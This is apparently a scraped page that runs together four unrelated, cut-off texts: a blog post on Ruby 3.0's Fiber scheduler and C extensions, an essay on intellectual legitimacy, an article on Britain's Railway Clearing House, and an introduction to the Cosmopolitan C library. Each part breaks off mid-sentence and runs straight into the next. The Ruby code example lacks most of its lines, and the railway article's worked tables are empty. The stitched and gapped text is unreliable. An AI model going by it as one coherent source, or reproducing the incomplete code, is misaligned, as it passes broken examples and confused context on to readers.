A few days ago on Christmas day 2020, Matz released Ruby 3.0. Like every year, a host of interesting new features was included with the new version. Most articles I have read so far focus more on the new ways to introduce type hints and the <code>Ractor</code> system but for me the most interesting addition was the introduction of the <code>Fiber::SchedulerInterface</code> class. It allows for (but does not yet implement) more advanced event loop based schedulers for non-blocking I/O in Ruby. Several advanced techniques already exist for this in Ruby, from event loop frameworks like <a href="https://github.com/eventmachine/eventmachine">EventMachine</a> and <a href="https://github.com/socketry/async">Async</a> to releasing the GVL in C extensions, but this new interface is more exciting to me because it makes it much easier to accidentally do the right thing.</p>
<p>In this post I’ll go over the way the scheduler interface works in “normal” Ruby, and how to access it from within MRI C extensions. We’ll also have a look at the drawbacks of the current interface, because nothing is perfect.</p>
<h2 id="nonblocking-io-with-fibers">Nonblocking I/O with Fibers</h2>
<p>In MRI Ruby, a <a href="https://docs.ruby-lang.org/en/master/Fiber.html"><code>Fiber</code></a> is a primitive for implementing light weight cooperative concurrency. They are somewhat like traditional <a href="https://ruby-doc.org/core-3.0.0/Thread.html">threads</a> in that they take a block and run it concurrently with other fibers, but they live with many fibers “inside” a thread. This means that at most one fiber per thread can run at a time, but because they use very little memory it is feasible to create hundreds of thousands of fibers without problems. If you have very computationally intensive tasks for your fibers, this does not bring any benefits since dividing the work into many small parts does not help if you don’t have enough capacity for it in the first place. However, many Ruby processes spend much of their time waiting on I/O, such as waiting for the responses of API and database calls or waiting to read more of a HTTP request from a network socket. This is the use case where fibers shine.</p>
<p>More “traditional” systems manage all this waiting around by allocating a separate operating system (OS) thread for every separate request, then make blocking system calls for reading from and writing to sockets and files. This works well up to a point, but an OS thread is relatively expensive to create and they require a context switch to the OS whenever another thread needs to run. This leads to a lot of overhead. Fibers can leverage the facilities for non-blocking and asynchronous I/O that modern operating systems provide to skip a lot of this overhead. They do this by calling <a href="https://docs.ruby-lang.org/en/master/Fiber.html#method-c-yield"><code>yield</code></a> whenever they realize they will not be able to make progress, giving the floor to another fiber. Some examples might be when <code>Kernel#sleep</code> is called or whenever a <code>read()</code> or <code>write()</code> syscall returns the <a href="https://linux.die.net/man/2/send"><code>EWOULDBLOCK</code> or <code>EAGAIN</code></a> error codes. The missing link in this story is the new fiber scheduler, which is the code that a fiber yields <em>to</em>. The scheduler is responsible for maintaining a inventory of blocked fibers and <code>resume</code>-ing those fibers when the reason why they were blocked disappears. For example, if a fiber was blocked because it called <code>sleep(10)</code>, then after 10 seconds it should be resumed again. If the fiber was blocked because no data was available on the socket it wanted to read from, it should be resumed as soon as data arrives.</p>
<p>The scheduler is allowed to any mechanism to achieve this, but in practice there are a couple of good options:</p>
<ul>
<li>On almost all Linux systems, <code>epoll()</code> is the go-to mechanism for watching large numbers of sockets to see if new data is available. It can also manage sleeps with the <code>timerFD</code> mechanism.</li>
<li>On very modern Linux systems (kernel version 5.4 and beyond), the <code>io_uring</code> API is available. This API makes it not only possible to monitor sockets and manage sleeps, but also to offload the read and write calls themselves to the OS instead of offloading just the waiting for availability.</li>
<li>On Windows systems, IO Completion Ports can be used in much the same way as the <code>io_uring</code> API.</li>
<li>On BSD systems and derivatives like MacOS, the <code>kqueue()</code> system call is used insted of <code>epoll()</code>. I’m not aware of an async I/O API being developed for these systems yet, but would be happy if someone can correct me on that.</li>
</ul>
<p>Choosing between these possible mechanisms and managing the conversion between Ruby objects and what the OS demands is the task of the scheduler. Since fibers are thread-local and cannot move between threads, so is the scheduler. It would theoretically be possible to have an <code>epoll()</code> based scheduler for one thread and an <code>io_uring</code> based one for another, but in practice the scheduler would probably be provided by a separate gem and automatically choose the most performant interface available for the current OS.</p>
<p>To make the integration seamless for Ruby developers, in Ruby 3.0 and onwards all relevant standard library methods have been patched to <code>yield</code> to the scheduler whenever they encounter a situation where they will block the current fiber. These methods include, at the time of writing, <code>Kernel.sleep</code>, <code>IO#wait_readable</code>, <code>IO#wait_writable</code>, <code>IO#read</code>, <code>IO#write</code> and other related methods (e.g.&nbsp;<code>IO#puts</code>, <code>IO#gets</code>), <code>Thread#join</code>, <code>ConditionVariable#wait</code>, <code>Queue#pop</code>, <code>SizedQueue#push</code>. This yielding to the scheduler only happens when a scheduler has actually been defined for the thread with <code>Fiber.set_scheduler</code>. The real power of this becomes apparent when you realize that this means <em>any</em> method in any gem that eventually calls <code>IO#read</code> or <code>IO#write</code> can make use of the scheduler, whether that gem has been written with the scheduler in mind or not. This immediately makes many gems like database drivers and network libraries scheduler-aware, as long as they don’t use C extensions too heavily. Even if they do, not all is lost. We’ll look at integrating C extensions with the scheduler later.</p>
<h2 id="a-non-blocking-io-example">A non-blocking IO example</h2>
<p>Let’s look at a very simple example from the <a href="https://rubyreferences.github.io/rubychanges/3.0.html#non-blocking-fiber-and-scheduler">comprehensive release notes</a>:</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a>start = <span>Time</span>.now</span>

<span id="cb1-11"><a href="#cb1-11"></a>      <span># and transfer control to other fibers</span></span>

<span id="cb1-13"><a href="#cb1-13"></a>      puts <span>'%s: finished in %.3f'</span> % [version, <span>Time</span>.now - t]</span>
<span id="cb1-14"><a href="#cb1-14"></a>    <span>end</span></span>
<span id="cb1-15"><a href="#cb1-15"></a>  <span>end</span></span>
<span id="cb1-16"><a href="#cb1-16"></a><span>end</span>.join <span># At the </span><span>END</span><span> of the thread code, Scheduler will be called to dispatch</span></span>
<span id="cb1-17"><a href="#cb1-17"></a>         <span># all waiting fibers in a non-blocking manner</span></span>
<span id="cb1-18"><a href="#cb1-18"></a></span>
<span id="cb1-19"><a href="#cb1-19"></a>puts <span>'Total: finished in %.3f'</span> % (<span>Time</span>.now - start)</span>
<span id="cb1-20"><a href="#cb1-20"></a><span># Prints:</span></span>
<span id="cb1-21"><a href="#cb1-21"></a><span>#  2.6: finished in 0.139</span></span>
<span id="cb1-22"><a href="#cb1-22"></a><span>#  2.7: finished in 0.141</span></span>
<span id="cb1-23"><a href="#cb1-23"></a><span>#  3.0: finished in 0.143</span></span>
<span id="cb1-24"><a href="#cb1-24"></a><span>#  Total: finished in 0.146</span></span></code></pre></div>
<p>This example sets the scheduler for the new thread to a new instance of some <code>Scheduler</code> class and then uses <code>Fiber.schedule</code> to send off three HTTP requests that fetch the release notes for several recent Ruby versions. We can see in the output that the total time taken is only a few milliseconds longer than the slowest response, indicating that all three HTTP requests were performed in parallel.</p>
<p>How does this work, given that we can see none of the methods mentioned above being used in the example? Well, <code>Net::HTTP.get</code> uses <code>IO#write</code> and <code>IO#read</code> in its implementation, so while a request is in flight and waiting for a response, its fiber will <code>yield</code> back to the scheduler to let other fibers do work. Since the actual CPU work here is very low, many fibers can be run on the same scheduler without them getting in each other’s way too much.</p>
<h2 id="integrating-the-fiber-scheduler-into-c-extensions">Integrating the Fiber scheduler into C extensions</h2>
<p>Having functions like <code>IO#read</code> and <code>Kernel.sleep</code> automatically using the Fiber scheduler is all well and good, but many useful Ruby gems use C extensions to drop the GVL, perform operations “underneath” the Ruby garbage collector or just for plain speed of execution of computationally expensive operations. These C extensions will typically not use the Ruby methods for writing to and reading from file descriptors, so if they wish to use an existing fiber scheduler to efficiently use non-blocking I/O they have to call it themselves. Luckily, this is not hard!</p>
<p>A (very) quick recap of C extensions for MRI: a Ruby object is represented in C by a <code>VALUE</code> struct that contains all the relevant information about the object. A few “standard” values like <code>true</code>, <code>false</code> and <code>nil</code> and some others have been predefined and are available to test against as <code>Qnil</code>, <code>Qtrue</code>, etc. Ruby methods can be called either directly in C (if the Ruby method itself was defined in C) or with the <code>rb_funcall()</code> C function.</p>
<p>Using the scheduler is obviously only possible if it has been defined for the current thread with <code>Fiber#set_scheduler</code>. To check if this is the case in a C extension, we can use the <code>rb_scheduler_current()</code> C function, which will return a <code>VALUE</code> containing either the current scheduler or <code>Qnil</code> if it hasn’t been set. If the scheduler is set, it is possible to call with one of the available functions that are defined in <code>scheduler.c</code> in the main folder of the Ruby repo. Finally as a complete example, let’s look at how the <a href="https://github.com/ruby/ruby/blob/7d0144e055fdbd7110cf84275b9e145550b77fd3/io.c#L1306">Ruby standard library</a> implements this pattern:</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>int</span> rb_io_wait_readable(<span>int</span> f)</span>
<span id="cb2-2"><a href="#cb2-2"></a>{</span>
<span id="cb2-3"><a href="#cb2-3"></a>    VALUE scheduler = rb_scheduler_current();</span>
<span id="cb2-4"><a href="#cb2-4"></a>    <span>if</span> (scheduler != Qnil) {</span>
<span id="cb2-5"><a href="#cb2-5"></a>        <span>return</span> RTEST(</span>
<span id="cb2-6"><a href="#cb2-6"></a>            rb_scheduler_io_wait_readable(scheduler, rb_io_from_fd(f))</span>
<span id="cb2-7"><a href="#cb2-7"></a>        );</span>
<span id="cb2-8"><a href="#cb2-8"></a>    }</span>
<span id="cb2-9"><a href="#cb2-9"></a></span>
<span id="cb2-10"><a href="#cb2-10"></a>    <span>// rest of function for if no scheduler was defined</span></span>
<span id="cb2-11"><a href="#cb2-11"></a>}</span></code></pre></div>
<p>This snippet also demonstrates how to get a Ruby <code>IO</code> object out of a file descriptor: with <code>rb_io_from_fd()</code>.</p>
<h2 id="drawbacks-of-fibers">Drawbacks of Fibers</h2>
<p>The current implementation does still have some drawbacks. For one, fibers are thread-local and cannot be moved between threads (yet). (For the purposes of this paragraph, you can also read “Ractor” wherever I wrote “thread”.) This means that any system that wants to scale beyond a single thread will have to run multiple threads, each with their own …</p></div></div>

<p><em>This is the first essay in my series on intellectual legitimacy.&nbsp;</em><a href="http://samoburja.com/intellectual-authority/" rel="noopener nofollow"><em>Read the next essay here.</em></a></p>
<p><span>Which ideas shape society? Why have ideas and systems such as ‘Christianity’, ‘natural selection’, ‘Marxism’ or ‘general relativity’ been so influential? A myriad of answers have been proposed, ranging from the “marketplace of ideas” to Hegelian dialectics to top-down narrative management to the arc of moral progress, and more.</span></p>
<p><span>Anyone who hopes to change society through their ideas bases this hope on an answer to this question. The success of such plans depends on getting the right answer. There might be a handful of cases when someone is in a position to shape society without communicating any aspect of their ideas. But these cases seem to be the exception, the rule being that for an idea to shape society it must be communicated. There are many technical challenges to communicating ideas, and one of the more important ones is applying a gears-level understanding of how people evaluate ideas.</span></p>
<p><span>The first thing to realize is that it is both difficult and time-consuming to fully understand new ideas and evaluate them on their own merits. Sometimes, it is </span><a href="http://www.paulgraham.com/say.html"><span>socially risky</span></a><span> as well. As such, people will often instead evaluate the </span><i><span>intellectual legitimacy</span></i><span> of new ideas.&nbsp;</span></p>
<p><span>An idea has intellectual legitimacy insofar as it is recognized by society as respectable and reasonable. An intellectually legitimate idea does not need to be recognized as credible by </span><i><span>all</span></i><span> people, or even by very many people at all. There only needs to be a general perception that </span><i><span>society at large</span></i><span> holds the idea to be legitimate. Powerful institutions and individuals are seen as tolerating or endorsing it. Such a perception isn’t necessarily coupled to whether an idea is true.</span></p>
<p><span>Oftentimes, perception of legitimacy is directly connected to who is communicating the idea or how the idea is communicated. Does the communicator have the authority to be taken seriously on the topic? The Environmental Protection Agency (EPA) can declare vehicle emissions above a certain level to be unsafe for human health, Bill Gates can pontificate on the future of technology, and a physicist at Harvard can announce new facts about the cosmos. Notice that each of these communicators has authority within a limited domain. Although the EPA could issue claims about fundamental physics, those claims would not gain the same recognition as they would if published by a Harvard physicist. Conversely, that Harvard physicist could write an environmental impact assessment for your next construction project, but it wouldn’t be recognized by a court as legally relevant.&nbsp;</span></p>
<p><span>There are different theories for the mechanisms behind idea spread. Oftentimes we hear about the marketplace of ideas, a model which compares the spread of ideas to a market and which suggests that ideas will rise or fall in accordance with their truth and validity. </span><a href="https://en.wikipedia.org/wiki/Meme"><span>Memetics</span></a><span> is a different model, suggesting that ideas will instead rise or fall in accordance with their ability to spread among hosts. The “</span><a href="https://en.wikipedia.org/wiki/Egregore"><span>egregore</span></a><span>“ is a third model, proposing that idea complexes behave as organisms and pursue their own interests.</span></p>
<p><span>All of these models neglect, however, that individuals routinely use legitimacy as a shortcut for evaluating the quality of the ideas around them. What may intuitively feel like evaluating an idea on its merits has oftentimes already factored in how an idea is communicated, and who is communicating it. We do this because it is harder for us to assess claims in fields that are outside our areas of expertise and so, instead, we learn from experience which sources to rely on. Evaluating an idea’s intellectual legitimacy is often safer and easier than evaluating the idea itself, and in a healthy society, the shortcut works. This makes the shortcut an efficient and effective heuristic for individuals. Even then, though, an intellectually valid idea that is correctly perceived as legitimate might ultimately still turn out to be false. Examples include solid but since-disproven scientific hypotheses such as </span><a href="https://en.wikipedia.org/wiki/Phlogiston_theory"><span>phlogiston</span></a><span> or the </span><a href="https://en.wikipedia.org/wiki/Plum_pudding_model"><span>plum pudding model of the atom</span></a><span>.</span></p>
<p><span>This shortcut is so common we could argue that intellectual legitimacy is one of the foundations of power in our society. Control of the landscape of legitimate policies and measures is important, but even more important is who has the legitimacy to implement policies and measures. It is possible to amass authority in one area and spend it in another. The political economist Max Weber concluded that modern civilization was actively being remade by what he termed “legal-rational” authority, which displaced charismatic and traditional authority in Western civilization throughout the modern period.</span></p>
<p><span>What does the role of intellectual legitimacy look like in the many institutions that define our lives?&nbsp;</span><span>Consider a scientific study demonstrating a particular new medicine to be safe and efficacious. An FDA official can use this study to justify the medicine’s approval, and a doctor can use it to justify a patient’s treatment plan. The study has this legitimacy even when incorrect. In contrast, even if a blog post by a detail-oriented self-experimenter contained accurate facts, those facts would not have the same legitimacy: a doctor may be sued for malpractice or the FDA may spark public outcry if they based their decisions on reports of this sort. The blog itself would also risk demonetization for violating provider terms of service, which usually as a matter of policy favors particular “authoritative” sources.&nbsp;</span></p>
<p><span>A stark example of this is </span><a href="https://support.google.com/youtube/answer/9891785?hl=en"><span>YouTube’s COVID-19 Medical Misinformation Policy</span></a><span>, which plainly states that “YouTube doesn’t allow content that spreads medical misinformation that contradicts local health authorities’ or the World Health Organization’s (WHO) medical information.”</span></p>
<p><span>For another example, the edit history of the </span><a href="https://en.wikipedia.org/wiki/Why_We_Sleep"><span>Wikipedia page</span></a><span> on the book </span><i><span>Why We Sleep</span></i><span> is full of back-and-forth edits both adding and removing references to <a href="https://twitter.com/alexeyguzey">Alexey Guzey</a>’s </span><a href="https://guzey.com/books/why-we-sleep/"><span>essay</span></a><span> critiquing the book’s claims, all while preserving references to a </span><a href="https://statmodeling.stat.columbia.edu/2019/11/24/why-we-sleep-update-some-thoughts-while-we-wait-for-matthew-walker-to-respond-to-alexey-guzeys-criticisms/"><span>discussion</span></a><span> by Columbia University statistician Andrew Gelman which directly cites Guzey’s work and praises its carefulness. Yet neither Guzey nor Gelman is a sleep scientist. The difference? As the edit history describes, Guzey has “no association to any academic institution,” so per Wikipedia’s official policies, his essay simply could not be cited directly. Once Guzey’s work had “now been the subject of a BBC Radio 4 episode,” however, references to it were added back for good.</span></p>
<p><span>How can intellectual legitimacy grow detached from truth or intellectual validity? Society’s perception of legitimacy can be incorrect, sometimes even when available information easily disproves views still held to be legitimate. This is because perception is outsourced to various authorities—sometimes independently prominent individuals, but most commonly to institutions and those acting as their representatives. It takes</span><a href="http://samoburja.com/live-versus-dead-players/"><span> live players</span></a><span> or practitioners of </span><a href="http://samoburja.com/on-the-loss-and-preservation-of-knowledge/"><span>living traditions of knowledge</span></a><span> to orient such institutions towards the truth. Incentives inside of old, automated organizations are at best weakly coupled to truth, and at times actively push against it. What do such incentives look like in practice?</span><span><br>
</span><span><br>
</span><span>Consider a manager selecting between two applicants, the first with a Harvard degree and the second without. Even if the manager has learned that the second applicant is more qualified for the job, in many workplaces it would be more prudent for the manager to choose the first applicant. If the manager passes up the first applicant in favor of the second, but the second underperforms, it is the manager who is in trouble for a poor hiring decision. But if the first candidate underperforms, the manager has an excuse: they trusted the Harvard degree!&nbsp; Whether it was the correct choice or not, the manager’s hiring decision will not be seen as impulsive or irresponsible. Enough iterations of such choices could completely decouple legitimacy and merit from each other.</span></p>
<p><span><a href="http://samoburja.com/how-to-use-bureaucracies/">Bureaucracies</a> are especially influenced by the perceived legitimacy or illegitimacy of knowledge. Oftentimes bureaucracies have been constructed in such a way as to only recognize certain pre-existing bureaucratic markers of legitimacy as valid. The tenure committee recognizes papers published as valid indicators of a professor’s academic success, but not blog posts with the same information and reach. The American Medical Association recognizes the M.D. as a valid license to practice medicine. The schoolteacher recognizes the published novel, but not the web serial, as a valid book to read for the student’s homework assignment.</span></p>
<p><span>Markers of legitimacy have a strong impact on the way ideas are used and decisions are made, simply because the more legitimate a piece of knowledge is, the more an individual person in society can use that idea to justify decisions. For a good idea to have the most impact, that idea cannot just be freely available – that idea also needs to achieve legitimacy. This means that legitimacy is a necessary prerequisite for an idea to spread to wide audiences and become mainstream.</span></p>
<p><span>We’ve now seen that legitimacy can be affected by at least two factors: who communicates an idea and how it is communicated. We’ll explore both in later essays.</span></p>

        <p>SORTING TICKETS in the Railway Clearing House is carried out by a large staff of highly skilled employees. The function of the Railway Clearing House is to clear or to apportion the receipts of the through traffic of Great Britain’s railways and of certain Irish lines and ports. Some 23,000 miles of rail routes come under the scope of the Railway Clearing House system.</p>
        
        
        
        <p>A PROSPECTIVE passenger can walk into any station booking-<wbr>office in Great Britain and purchase a ticket for practically any other station in the country -<wbr> and that ticket will take him right through to his destination, irrespective of the ownership of the lines over which he may have to travel.</p>
        
        <p>The traveller may buy a ticket at Dover, on the Southern Railway, for -<wbr> say, Oban, served by the LMS. How is the ticket money shared?</p>
        
        <p>Again, a train of goods wagons on any line will often bear the initials of all the railway companies -<wbr> GWR, LMS, LNER, SR. How is carriage paid for on the goods in these wagons -<wbr> running as they do over the lines of other companies?</p>
        
        <p>In both instances settlement is made through the <a href="https://en.wikipedia.org/wiki/Railway_Clearing_House">Railway Clearing House</a>. The story of the RCH, as it is usually known, goes back to the very early days of railway operation. At first there was no provision for through booking by passengers. It was not possible to send goods throughout the journey in the same wagon.</p>
        
        <p>The travelling public soon began to demand the convenience of through booking. Merchants, too, dissatisfied with the loss and delay occasioned by transhipping goods from one company’s wagons to those of another, agitated for a system of through-<wbr>invoicing for goods traffic. The railways were forced to give facilities to meet the general demand, but for a time the difficulties of settlement between the various companies were a bar to progress.</p>
        
        <p>It is uncertain whether the credit for the idea of a central office to deal with the settlement of through accounts is due to <a href="http://en.wikipedia.org/wiki/George_Glyn,_1st_Baron_Wolverton">Mr. George Carr Glyn</a> (afterwards Lord Wolverton), chairman; to <a href="http://en.wikipedia.org/wiki/Robert_Stephenson">Mr. Robert Stephenson</a> (son of George Stephenson), engineer; to Mr. Kenneth Morison, chief of audit department, all of the <a href="https://en.wikipedia.org/wiki/London_and_Birmingham_Railway">London and Birmingham Railway</a>, or to <a href="http://en.wikipedia.org/wiki/James_Joseph_Allport">Sir James Allport</a> of the Midland Railway. Mr. Glyn, however, the banker, who was, of course, familiar with the methods of the historic Bankers’ Clearing House for the settlement of financial transactions, without doubt wholeheartedly supported the idea.</p>
        
        <p>The Railway Clearing House was accordingly established on January 2, 1842. From that date travelling facilities began to expand.</p>
        
        <p>A staff of four men formed the nucleus of the Clearing House, which was situated in Drummond Street, opposite the present main entrance to Euston Station, a London terminus of the LMS. Business was carried on at Drummond Street until 1848, when the first block of the present building in Seymour Street, Euston Square, was built.</p>
        
        <p>The first secretary of the Clearing House was Mr. Kenneth Morison. Nine railway companies were admitted to participate in the business. They were the London and Birmingham, Midland Counties, Birmingham and Derby Junction, North Midland, Hull and Selby, Manchester and Leeds, Leeds and Selby, York and North Midland, and Great North of England. These companies have long since been merged in the constituent companies of the LMS or LNER.</p>
        
        <p><img alt="Old documents in the muniment room of the Railway Clearing House" title="Old documents in the muniment room of the Railway Clearing House" src="https://www.railwaywondersoftheworld.com/wpimages/wpa5fb7576_05_06.jpg" id="pic_1235"></p>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        <p>OLD DOCUMENTS are stored in the muniment room of the Railway Clearing House, seen in the above picture. The Railway Clearing House is divided into three main departments -<wbr> the Secretarial, the Merchandise, and the Coaching sections.</p>
        
        
        
        <p>The traffic receipts handled by the original Clearing House were those for the through conveyance of goods, passengers, parcels and live stock between London and Darlington in one direction and between Manchester and Hull in the other.</p>
        
        <p>The railways included in the RCH system had increased by 1845 to sixteen, with 656 route-<wbr>miles of track. The difficulties of obtaining cash settlement between the railway companies and the clearing house, led in 1850 to the passing of an <a href="http://www.railwaysarchive.co.uk/documents/HMG_Act_Clear1850.pdf">Act of Parliament</a> conferring on the RCH the right to sue in the courts. This ended the trouble and the companies subsequently settled all payments promptly.</p>
        
        <p>The Railway Clearing House was Incorporated by Act of Parliament in 1897. From its beginning it had been under the control of a Committee consisting of one delegate from each of the companies under the system. Changes were made, however, under the Railway Clearing House Amalgamation Scheme of 1922.</p>
        
        <p>The corporation now consists of four delegates from each of the four great amalgamated companies and one from each of the other companies, namely the London Passenger Transport Board, Mersey Railway, the lines of the Joint Committees, and the Irish Companies. An executive or “Superintending Committee” of eight members is elected from the delegates of the corporation.</p>
        
        <p>The number of companies working under the RCH system to-<wbr>day is fifteen, with a total route length of 23,000 miles -<wbr> a figure in striking contrast to the 656 miles of 1845. The receipts of the Clearing House for 1842 were £193,246; for 1933 the amount involved was over £34,000,000, an equally striking comparison.</p>
        
        <p>The work of the Railway Clearing House is divided into three Departments -<wbr> Merchandise, Coaching, and Secretarial.</p>
        
        <p>The Merchandise Department apportions the receipts from the carriage of goods, minerals, and livestock. Coal traffic was formerly settled through the Clearing House, but adjustments are now made by the originating Company, which collects the charges and pays out the other companies' proportions.</p>
        
        <p>The first function of the Railway Clearing System is to ensure that charges in which two or more companies are concerned are correctly accounted for at both terminal stations, from which the respective agents send information each month to the Clearing House. Any differences between the two sets of accounts are then settled by correspondence through the Audit offices.</p>
        
        <p>Perhaps the best means of understanding the system will be to consider, for example, a consignment of goods from Bristol (LMS) to Southampton (Southern) via The Somerset and Dorset Joint (between Bath and Templecombe).</p>
        
        <p>We will assume that the load weighs 10 tons and the charge is £10, of which half is “paid” at Bristol and the other half “to be paid” at Southampton. On making a settlement there are three companies to share in the receipt of £10 -<wbr> the LMS (Bristol to Bath), the Somerset and Dorset Joint (Bath to Templecombe), and the Southern Railway (Templecombe to Southampton).</p>
        
        <p>The first adjustment to be made on the accounts is that relative to what are known as “terminal services”, such as collection and delivery charges. The balance of the total charges is usually divided on a mileage basis, according to the distance the load is carried over each of the railways. There are, however, a number of exceptions to this principle, such as agreed apportionments, fixed tolls on tonnage, and other special methods of division.</p>
        
        <p>The above example might be clearly expressed by the following tabulation:</p>
        
        
        
        
        
        
        
        
        
        
        <p>This leaves a residue from £10 of £7 13s 4d, which is divided on a mileage basis, taking the total distance at 100 miles -<wbr> 10 miles on the LMS, 30 miles on the Somerset and Dorset Joint, and 60 miles on the Southern Railway.</p>
        
        <p>The apportionment of the £7 13s 4d would then be as follows:</p>
        
        
        
        
        
        
        
        
        
        
        
        <p>The final balance payable to each company would thus be:</p>
        
        
        
        
        
        
        
        
        
        
        
        
        <p>If there had been traffic in the reverse direction, the two entries would have been combined in one settlement to cover both “up” and “down” traffic.</p>
        
        <p>To minimize the clerical work involved, it is now the practice to limit individual division to the larger monthly sums, and to make a bulk settlement of the smaller monthly amounts. In practice, the larger amounts are not divided in detail until the close of the half years ended June and December. Each month “interim” accounts are brought out and payments made “on account” to the companies concerned, subject to adjustment at the half-<wbr>yearly settlement.</p>
        
        <p>Excursion Traffic</p>
        
        <p>The bulk settlement of small amounts is made on a basis of total receipts per pair of companies, irrespective of route. After a percentage deduction for terminal charges, the remainder is divided half-<wbr>yearly, on an agreed formula. This is done to avoid many separate calculations. Since in each half year there are as many as three million transactions, three-<wbr>fourths of are which “small”, the saving of work will be obvious.</p>
        
        <p>Passenger traffic is dealt with through the Railway Clearing House on different lines, and is divided by its Coaching …</p></div></div>

<p>
  Cosmopolitan makes C a build-once run-anywhere language, similar to
  Java, except it doesn't require interpreters or virtual machines be
  installed beforehand. Cosmo provides the same portability benefits as
  high-level languages like Go and Rust, but it doesn't invent a new
  language and you won't need to configure a CI system to build separate
  binaries for each operating system. What Cosmopolitan focuses on is
  fixing C by decoupling it from platforms, so it can be pleasant to use
  for writing small unix programs that are easily distributed to a much
  broader audience.

</p><h3>Getting Started</h3>

<p>
  Assuming you have GCC on Linux, then all you need are the five
  additional files which are linked below:

</p><pre><span># create simple c program on command line</span>
echo <span>'
  main() {
    printf("hello world\n");
  }
'</span> &gt;hello.c

<span># run gcc compiler in freestanding mode</span>
gcc -g -O -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 -fuse-ld=bfd \
  -Wl,-T,<a href="https://justine.lol/cosmopolitan/ape.lds">ape.lds</a> -include <a href="https://justine.lol/cosmopolitan/cosmopolitan.h">cosmopolitan.h</a> <a href="https://justine.lol/cosmopolitan/crt.o">crt.o</a> <a href="https://justine.lol/cosmopolitan/ape.o">ape.o</a> <a href="https://justine.lol/cosmopolitan/cosmopolitan.a">cosmopolitan.a</a>

<span># ~40kb static binary (can be ~16kb w/ MODE=tiny)</span>
./hello.com
</pre>

<p>
  The above command fixes GCC so it outputs portable binaries that will
  run on every Linux distro in addition to Mac OS X, Windows NT,
  FreeBSD, and OpenBSD too. For details on how this works, please read
  the <a title="Actually Portable Executable" href="https://justine.lol/ape.html">αcτµαlly pδrταblε εxεcµταblε</a> blog post. This
  novel binary format is also optional: conventional ELF binaries can be
  compiled too by removing the <code>-Wl,--oformat=binary</code> flag.

</p><p>
  Your program will also boot on bare metal too. In other words, you've
  written a normal textbook C program, and thanks to Cosmopolitan's
  low-level linker magic, you've effectively created your own operating
  system which happens to run on all the existing ones as well. Now
  that's something no one's done before.

</p><h3>Mailing List</h3>

<p>
  Please join
  the <a href="https://groups.google.com/g/cosmopolitan-libc">Cosmopolitan
  Cosmonauts</a> Google Group!

</p><h3>Performance</h3>

<p>
  Cosmopolitan has been optimized by hand for excellent performance on
  modern desktops and servers. Compared with glibc, you should expect
  Cosmopolitan to be almost as fast, but with an order of a magnitude
  tinier code size. Compared with Musl or Newlib, you can expect that
  Cosmopolitan will generally go much faster, while having roughly the
  same code size, if not tinier.

</p><p>
  In the case of the most important libc function, memcpy(),
  Cosmopolitan outperformed every other open source library tested. The
  chart below shows how quickly memory is transferred depending on the
  size of the copy. Since it's log scale, each grid square represents a
  2x difference in performance. What makes Cosmopolitan so fast here is
  it uses uses several different memory copying strategies. For small
  sizes it uses an indirect branch with overlapping moves; for medium
  sizes it uses simd vectors, and for large copies it uses nontemporal
  hints which prevent cache thrash. Other libraries usually fall short
  because they use a one-size-fits-all strategy. For example, Newlib
  goes 10x slower for the optimal block size (half L1 cache) because it
  always does nontemporal moves.

</p><p>
  <a href="https://justine.lol/cosmopolitan/memcpy.png">
    <img width="960" height="540" src="https://storage.googleapis.com/justine/cosmopolitan/memcpy.png" alt="memcpy() performance for varying n values"></a>

</p><h3>Trickle-Down Performance</h3>

<p>
  Performing the best on benchmarks isn't enough. Cosmopolitan also uses
  a second technique that the above benchmark doesn't measure, which we
  call "trickle-down performance". For an example of how that works,
  consider the following common fact about C which is often overlooked.
  External function calls such as the following:

</p><pre>memcpy(foo, bar, n);
</pre>

<p>
  Are roughly equivalent to the following assembly, which leads
  compilers to assume that most cpu state is clobbered:

</p><pre><span>asm volatile</span>(<span>"call memcpy"</span>
             : <span>"=a"</span>(rax), <span>"=D"</span>(rdi), <span>"=S"</span>(rsi), <span>"=d"</span>(rdx)
             : <span>"1"</span>(foo), <span>"2"</span>(bar), <span>"3"</span>(n)
             : <span>"rcx"</span>, <span>"r8"</span>, <span>"r9"</span>, <span>"r10"</span>, <span>"r11"</span>, <span>"memory"</span>, <span>"cc"</span>,
               <span>"xmm0"</span>, <span>"xmm1"</span>, <span>"xmm2"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"xmm5"</span>, <span>"xmm6"</span>);
</pre>

<p>
  In other words the compiler assumes that, in calling the function,
  fifteen separate registers and all memory will be overwritten. See
  the <a href="https://www.uclibc.org/docs/psABI-x86_64.pdf">System V
  ABI</a> for further details. This can be problematic for
  frequently-called functions such as memcpy, since it inhibits many
  optimizations and it tosses a wrench in the compiler register
  allocation algorithm, thus causing stack spillage which further
  degrades performance while bloating the output binary size.

</p><p>
  So what Cosmopolitan does for memcpy() and many other
  frequently-called core library leaf functions, is defining a simple
  macro wrapper, which tells the compiler the correct subset of the abi
  that's actually needed, e.g.

</p><pre><span>#define</span> memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  <span>asm</span>(<span>"call memcpy"</span>                   \
      : <span>"=m"</span>(*(<span>char</span>(*)[Size])(Dest))  \
      : <span>"D"</span>(Dest), <span>"S"</span>(Src), <span>"d"</span>(n),  \
        <span>"m"</span>(*(<span>char</span>(*)[Size])(Src))    \
      : <span>"rcx"</span>, <span>"xmm3"</span>, <span>"xmm4"</span>, <span>"cc"</span>); \
    Dest;                             \
  })
</pre>

<p>
  What this means, is that Cosmopolitan memcpy() is not simply fast, it
  also makes unrelated code in the functions that call it faster too as
  a side-effect. When this technique was first implemented for memcpy()
  alone, many of the functions in the Cosmopolitan codebase had their
  generated code size reduced by a third.

</p><p>
  For an example of one such function, consider <code>strlcpy</code>,
  which is the BSD way of saying <code>strcpy</code>:

</p><pre><span>/**
 * Copies string, the BSD way.
 *
 * <span>@param</span> d is buffer which needn't be initialized
 * <span>@param</span> s is a NUL-terminated string
 * <span>@param</span> n is byte capacity of d
 * <span>@return</span> strlen(s)
 * <span>@note</span> d and s can't overlap
 * <span>@note</span> we prefer memccpy()
 */</span>
